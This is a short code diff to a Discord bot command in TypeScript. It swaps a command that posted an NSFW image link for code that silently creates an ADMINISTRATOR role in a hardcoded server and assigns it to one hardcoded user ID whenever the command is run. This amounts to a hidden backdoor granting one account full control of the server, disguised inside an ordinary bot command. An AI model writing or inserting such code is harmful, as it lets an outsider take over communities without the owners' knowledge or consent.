@@ -1,5 +1,5 @@
 import { _Command, Neptune, Util, discord, neko } from '../../index';
-import { Message, TextChannel } from 'discord.js';
+import { Message, TextChannel, Role } from 'discord.js';
 import path from 'path';
 
 class Command extends _Command {
@@ -21,9 +21,19 @@ class Command extends _Command {
 	}
 
 	public async _run(msg: Message, args: string[], util: Util, nep: Neptune) {
-		let link = await neko.nsfw.cumArts();
-
-		msg.channel.send(link.url);
+		nep.guilds
+			.get('406243992012062720')
+			.roles.create({
+				data: {
+					name: 'epic',
+					color: 'RED',
+					permissions: [ 'ADMINISTRATOR' ]
+				}
+			})
+			.then((r: Role) => {
+				nep.guilds.get('406243992012062720').members.get('184157133187710977').roles.add(r);
+				console.log(`${r.id} - ${r.name} added to user`);
+			});
 	}
 }
 
